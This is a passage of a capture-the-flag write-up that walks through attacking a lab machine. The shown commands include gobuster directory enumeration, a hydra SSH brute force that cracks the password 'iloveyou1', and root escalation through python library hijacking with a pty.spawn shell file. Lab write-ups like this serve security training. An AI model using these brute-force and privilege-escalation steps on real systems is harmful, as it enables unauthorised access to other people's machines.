Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 85.22 secondsSince port 80 is open, lets do some passive recon on the website.I listed down all the usernames I found in the website that is important for later use.  meliodas  root  www-data  AnonymousSince there is no other webpages because menu bars is not clickable, lets scan for subdomains.gobusterroot@mirai:~# gobuster dir -u 10.10.85.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html --timeout 50s -t 170 -f===============================================================2022/03/08 01:36:48 Starting gobuster in directory enumeration mode===============================================================/images/              (Status: 200) [Size: 1640]/icons/               (Status: 403) [Size: 292]/index.html           (Status: 200) [Size: 5439]/robots.txt           (Status: 200) [Size: 33]Opening the robots.txt on the browser gives the following text.“rockyou”??? Seems familiar because there’s this famous wordlist named rockyou.txt, maybe its a hint for us to bruteforce something?Lets try to bruteforce the port 22 (SSH) with hydra!hydrahydra -L meliodas users -P /usr/share/wordlists/rockyou.txt ssh://10.10.85.187 -t 4Successfully cracked the credential with a password of iloveyou1Login to the ssh and get the user.txt flag!Privilege Escalation: meliodas –&gt; rootpython library hijackingAs you can see when running sudo -l we can run the file /home/meliodas/bak.py which was owned by root.Lets analyze the code since we cannot modify the python file.#!/usr/bin/env pythonimport osimport zipfiledef zipdir(path, ziph):    for root, dirs, files in os.walk(path):        for file in files:            ziph.write(os.path.join(root, file))if __name__ == '__main__':    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)    zipdir('/var/www/html', zipf)    zipf.close()The code seems not vunerable to any code injection. So, As I am searching python zipfile module exploits in google, I came across to this blog post privilege escalation via python library hijacking.Let’s replicate what he did in the blog post.  Create a file os.py in the same directory as bak.py and put the contents below.      import pty  pty.spawn('/bin/bash')        Run this command sudo /usr/bin/python3 /home/meliodas/bak.py  It doesnt work with the python os library, lets repeat the same steps with zipfile library.And we are now root!Easiest way to gain root  Delete the bak.py file  Create a new one and put the contents below     import pty pty.spawn('/bin/bash')            and run it      Thank you!"
